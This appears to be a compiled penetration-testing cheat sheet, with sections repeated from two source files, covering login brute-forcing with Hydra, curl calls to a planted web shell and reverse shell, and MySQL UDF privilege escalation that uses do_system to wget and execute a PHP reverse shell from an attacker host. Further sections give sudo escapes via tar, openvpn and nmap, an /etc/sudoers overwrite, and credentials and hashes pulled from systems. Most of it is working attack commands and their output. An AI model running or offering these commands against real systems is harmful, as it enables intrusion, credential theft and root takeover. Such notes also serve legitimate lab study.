## Web Application Login Checklist

> Source: `01101100-C0D3X-00110110.md` → `Detailed Checklists > Web Application Login Checklist`

1. Try empty username and password fields.
2. Use the username as the password.
3. Search for default credentials.
4. Bruteforce with small username and password lists.
5. Fuzz for special characters using:

```bash
/usr/share/seclists/Fuzzing/special-chars.txt
```

6. Attempt to bypass the login page.
7. Bruteforce with a userlist and a password list generated from `cewl`.
8. Check for account lockout policies.
9. Analyze error messages for hints.
10. Step back and review your enumeration—**try harder.**
11. Ensure all possible avenues have been explored.


## HTTP POST Login

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Hydra > HTTP POST Login`

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

> The first field is the login form location, the second is the request body (username and password - `^PASS^` is Hydra's placeholder), and the third is the failed login identifier.


## HTTP AUTH (Basic)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Hydra > HTTP AUTH (Basic)`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.217.201 http-get

curl -X POST -i -H "Authorization: Basic b2Zmc2VjOmVsaXRl" http://192.168.150.46:242

curl <https://example.com/protected-resource> \\
-H "Authorization: Basic $(echo -n "username:password" | base64)"
-H "X-API-Token: your_api_token"

# Using FTP or another service, place a simpple php shell AND reverse shell and call it
$ curl -H 'Authorization: Basic b2Zmc2VjOmVsaXRl' -G --data-urlencode 'cmd=.\rev.exe' http://192.168.160.46:242/cmd.php
```


## enum_logins

> Source: `01101100-C0D3X-00110110.md` → `MSSQL > enum_logins`

https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-principals-transact-sql?view=sql-server-ver16&tabs=sql
```
select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, 
sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin 
from  master.sys.server_principals r 
left join master.sys.syslogins sl on sl.sid = r.sid 
where r.type in ('S','E','X','U','G')
```


## MySQL login

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > MySQL login`

```
<cation/config$ mysql -u 'school' -p 'school_mgment'         
Enter password: @jCma4s8ZM<?kA
```

```
mysql> show databases;
mysql> show tables;
```

```
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| school_mgment      |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```

```
mysql> select * from teacher\G

select * from teacher\G
*************************** 1. row ***************************
     teacher_id: 1
           name: Testing Teacher
           role: 1
 teacher_number: f82e5cc
       birthday: 2018-08-19
            sex: male
       religion: Christianity
    blood_group: B+
        address: 546787, Kertz shopping complext, Silicon Valley, United State of America, New York city.
          phone: +912345667
          email: michael_sander@school.pg
       facebook: facebook
        twitter: twitter
     googleplus: googleplus
       linkedin: linkedin
  qualification: PhD
 marital_status: Married
      file_name: profile.png
       password: 3db12170ff3e811db10a76eadd9e9986e3c1a5b7
  department_id: 2
 designation_id: 4
date_of_joining: 2019-09-15
 joining_salary: 5000
         status: 1
date_of_leaving: 2019-09-18
        bank_id: 3
   login_status: 0
1 row in set (0.00 sec)
```

```
port 0.0.0.0:3306 open internally
users with console mysql/bin/bash
MySQL connection using root/NOPASS Yes
```

```
your $IP>wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
victim>gcc -g -c raptor_udf2.c
victim>gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
victim>mysql -u root -p
```

```
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/j0hn/script/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function | 
+-----------+-----+----------------+----------+
```

```
your $IP> cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
nc -nvlp 443
mysql> select do_system('wget http://192.168.119.184/shell.php -O /tmp/shell.php;php /tmp/shell.php');
sh-3.2# id
uid=0(root) gid=0(root)
```

```
sudo su -
root@example01:~# whoami
root
```

```
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh


# maybe need to think outside the box
# 1. Create files in the current directory called  
# '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'  
  
echo "" > '--checkpoint=1'  
echo "" > '--checkpoint-action=exec=sh privesc.sh'  
  
# 2. Create a privesc.sh bash script, that allows for privilege escalation  
#malicous.sh:  
echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers  
  
#The above injects an entry into the /etc/sudoers file that allows the 'kali'   
#user to use sudo without a password for all commands  
#NOTE: we could have also used a reverse shell, this would work the same!  
#OR: Even more creative, you could've used chmod to changes the permissions  
#on a binary to have SUID permissions, and PE that way
```

```
(ALL) NOPASSWD: /usr/bin/borg list *
(ALL) NOPASSWD: /usr/bin/borg mount *
(ALL) NOPASSWD: /usr/bin/borg extract *
```


## Exploitation

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > MySQL login > Exploitation`

```
sarah@backup:/opt$ sudo /usr/bin/borg list *
```

```
(name of archive) (data & time) (hash of archive)
```

```
sarah@backup:/opt$ sudo /usr/bin/borg extract borgbackup::home
```

```
sudo /usr/bin/borg extract [folder that is writable]::[name of archive]
```

```
sarah@backup:/opt$ sudo /usr/bin/borg extract --stdout borgbackup::home
```

```
mesg n 2> /dev/null || true
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
```

```
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
# id
uid=0(root) gid=0(root) groups=0(root)
```

```
bash-3.2$ id     
id
uid=100(asterisk) gid=101(asterisk)
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```


## HTTP AUTH (Basic)

> Source: `01101100-RUN3-00110110.md` → `Exploitation > Password Attacks > Hydra > HTTP AUTH (Basic)`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.217.201 http-get
```


## MySQL login

> Source: `01101100-RUN3-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > MySQL login`

```
<cation/config$ mysql -u 'school' -p 'school_mgment'         
Enter password: @jCma4s8ZM<?kA
```

```
mysql> show databases;
mysql> show tables;
```

```
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| school_mgment      |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```

```
mysql> select * from teacher\G

select * from teacher\G
*************************** 1. row ***************************
     teacher_id: 1
           name: Testing Teacher
           role: 1
 teacher_number: f82e5cc
       birthday: 2018-08-19
            sex: male
       religion: Christianity
    blood_group: B+
        address: 546787, Kertz shopping complext, Silicon Valley, United State of America, New York city.
          phone: +912345667
          email: michael_sander@school.pg
       facebook: facebook
        twitter: twitter
     googleplus: googleplus
       linkedin: linkedin
  qualification: PhD
 marital_status: Married
      file_name: profile.png
       password: 3db12170ff3e811db10a76eadd9e9986e3c1a5b7
  department_id: 2
 designation_id: 4
date_of_joining: 2019-09-15
 joining_salary: 5000
         status: 1
date_of_leaving: 2019-09-18
        bank_id: 3
   login_status: 0
1 row in set (0.00 sec)
```

```
port 0.0.0.0:3306 open internally
users with console mysql/bin/bash
MySQL connection using root/NOPASS Yes
```

```
your $IP>wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
victim>gcc -g -c raptor_udf2.c
victim>gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
victim>mysql -u root -p
```

```
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/j0hn/script/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function | 
+-----------+-----+----------------+----------+
```

```
your $IP> cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
nc -nvlp 443
mysql> select do_system('wget http://192.168.119.184/shell.php -O /tmp/shell.php;php /tmp/shell.php');
sh-3.2# id
uid=0(root) gid=0(root)
```

```
sudo su -
root@example01:~# whoami
root
```

```
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
(ALL) NOPASSWD: /usr/bin/borg list *
(ALL) NOPASSWD: /usr/bin/borg mount *
(ALL) NOPASSWD: /usr/bin/borg extract *
```
